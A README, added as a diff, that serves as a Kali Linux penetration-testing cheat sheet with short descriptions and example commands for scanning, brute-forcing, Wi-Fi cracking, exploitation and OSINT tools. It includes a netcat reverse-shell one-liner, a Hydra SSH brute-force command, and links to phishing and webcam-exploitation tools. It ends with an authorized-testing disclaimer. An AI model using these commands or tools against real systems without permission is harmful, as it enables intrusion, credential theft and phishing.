@@ -1,0 +1,129 @@
+# Kali Linux Tools Cheat Sheet 🕵️‍♂️
+
+This README provides a quick overview of some of the tools I used penetration testing, covering everything from network scanning to brute-forcing and cryptography. For more details on each tool, links to their respective documentation or download pages are provided.
+
+**Note**: This guide assumes that you are using **[Kali Linux](https://www.kali.org/docs/installation/)**, a popular Linux distribution for penetration testing and security auditing. Follow the link to install Kali Linux if you haven't already.
+
+---
+
+## Network Scanning and Reconnaissance
+
+### [Nmap](https://nmap.org/)
+- **Description**: A powerful network scanning tool used to discover hosts, services, and open ports.
+- **Example Usage**: `nmap -sS -A -T4 <target_ip>`
+
+### [Netcat (nc)](https://nc110.sourceforge.io/)
+- **Description**: A versatile networking utility for reading from and writing to network connections. Often used as a simple client-server tool.
+- **Example Usage**: `nc -lvp 4444` (Listen on port 4444)
+
+### [Recon-ng](https://tools.kali.org/information-gathering/recon-ng)
+- **Description**: A full-featured web reconnaissance framework with modules for gathering OSINT.
+- **Example Usage**: `recon-ng` (Opens the Recon-ng console)
+
+### [Nikto](https://cirt.net/Nikto2)
+- **Description**: A web server scanner that checks for dangerous files, outdated server software, and other issues.
+- **Example Usage**: `nikto -h http://<target_url>`
+
+---
+
+## Password Brute-Forcing
+
+### [Hydra](https://github.com/vanhauser-thc/thc-hydra)
+- **Description**: A fast online password-cracking tool supporting multiple protocols, such as FTP, SSH, and HTTP.
+- **Example Usage**: `hydra -l admin -P passwords.txt ssh://<target_ip>`
+
+### [Hashcat](https://hashcat.net/hashcat/)
+- **Description**: A password-cracking tool that uses CPU and GPU acceleration for fast and efficient brute-forcing of password hashes.
+- **Example Usage**: `hashcat -m 0 -a 0 hashes.txt rockyou.txt`
+
+---
+
+## Phishing
+### [Zphisher](https://github.com/htr-tech/zphisher)
+- **Description**: An automated phishing tool with 30+ templates for social media, email, and other platforms.
+
+
+### [Camhacker](https://github.com/AngelSecurityTeam/Cam-Hackers)
+- **Description**: A tool designed to exploit vulnerabilities in webcams and capture images.
+
+---
+
+## Wi-Fi Attacks
+
+### [Aircrack-ng](https://www.aircrack-ng.org/)
+- **Description**: A suite of tools for Wi-Fi network security assessment, including packet capture and WEP/WPA password cracking.
+- **Example Usage**: `airmon-ng start wlan0`
+
+---
+
+## Exploitation Tools
+
+### [Metasploit Framework](https://www.metasploit.com/)
+- **Description**: A comprehensive exploitation framework with a large database of exploits and payloads.
+- **Example Usage**: `msfconsole` (Opens the Metasploit console)
+
+### [SQLmap](http://sqlmap.org/)
+- **Description**: An automated SQL injection tool that can detect and exploit SQL vulnerabilities in databases.
+
+---
+
+## Cryptography 
+
+### [John the Ripper](https://www.openwall.com/john/)
+- **Description**: A fast password cracker that supports a wide range of hash types.
+- **Example Usage**: `john --wordlist=rockyou.txt hashes.txt`
+
+### [Hash-identifier](https://tools.kali.org/password-attacks/hash-identifier)
+- **Description**: A tool to identify the type of hash you are working with based on its format.
+- **Example Usage**: `hash-identifier`
+
+---
+
+## Scripting 
+
+### [Python](https://www.python.org/)
+- **Description**: Python can be used to host a local HTTP server or create scripts for automated tasks in penetration testing.
+- **Example Usage**: `python3 -m http.server 8080` (Start a local server on port 8080)
+
+### [Netcat (nc)](https://nc110.sourceforge.io/)
+- **Description**: Besides networking, Netcat can also be used for scripting in file transfers or creating reverse shells.
+- **Example Usage**: `nc -e /bin/sh <target_ip> <port>`
+
+---
+
+## Open Source Intelligence (OSINT)
+
+### [theHarvester](https://github.com/laramies/theHarvester)
+- **Description**: A tool for gathering information about emails, subdomains, and other OSINT data.
+- **Example Usage**: `theharvester -d <domain> -l 500 -b google`
+
+### [Maltego](https://www.maltego.com/)
+- **Description**: A visual link analysis tool for OSINT investigations and relationship mapping.
+- **Example Usage**: Launch the Maltego GUI and use transforms to gather information.
+
+---
+
+## Packet Inspection
+
+### [Wireshark](https://www.wireshark.org/)
+- **Description**: A GUI-based network protocol analyzer for capturing and analyzing network traffic.
+- **Example Usage**: Open Wireshark and start capturing packets on a selected interface.
+
+### [tcpdump](https://www.tcpdump.org/)
+- **Description**: A command-line packet analyzer tool used to capture and inspect TCP/IP traffic.
+- **Example Usage**: `tcpdump -i eth0`
+
+
+
+## 📚 Further Reading
+
+- **[Kali Linux Documentation](https://www.kali.org/docs/)**: Comprehensive documentation on using and customizing Kali Linux.
+- **[Exploit-DB](https://www.exploit-db.com/)**: A repository of exploits and proof-of-concept code for various vulnerabilities.
+- **[OWASP Top Ten](https://owasp.org/www-project-top-ten/)**: A list of the top ten most critical security risks to web applications.
+
+---
+
+### Disclaimer
+
+This cheat sheet is for educational and authorized penetration testing purposes only. Unauthorized access or usage of these tools for malicious purposes is illegal and unethical. Always obtain permission before testing any network or system.
+
